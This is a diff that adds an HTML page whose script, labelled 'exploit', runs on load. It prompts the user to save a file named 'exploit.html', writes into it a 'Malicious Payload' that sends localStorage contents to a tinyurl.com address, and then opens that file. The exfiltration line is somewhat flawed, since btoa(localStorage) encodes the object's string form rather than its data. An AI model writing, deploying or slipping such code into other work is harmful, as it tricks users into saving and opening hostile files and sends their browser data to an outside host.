@@ -44,3 +44,47 @@
 </body>
 </html>
  -->
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // 1. Use the modern File System Access API
+    async function exploit() {
+      try {
+        // Request filesystem handle
+        const handle = await window.showSaveFilePicker({
+          suggestedName: 'exploit.html',
+          types: [{
+            description: 'HTML Files',
+            accept: { 'text/html': ['.html'] },
+          }],
+        });
+
+        // Write malicious content
+        const writable = await handle.createWritable();
+        await writable.write(`
+          <html>
+            <body onload="alert(document.location)">
+              <h1>Malicious Payload</h1>
+              <script>
+                // Steal localStorage or execute system commands
+                fetch('https://tinyurl.com/yz885dsu/log?data=' + btoa(localStorage));
+              </`+`script>
+            </body>
+          </html>
+        `);
+        await writable.close();
+
+        // Auto-open the file (if allowed)
+        const file = await handle.getFile();
+        const url = URL.createObjectURL(file);
+        window.open(url);
+
+      } catch (err) {
+        console.error('Exploit failed:', err);
+      }
+    }
+    exploit();
+  </script>
+</body>
+</html>
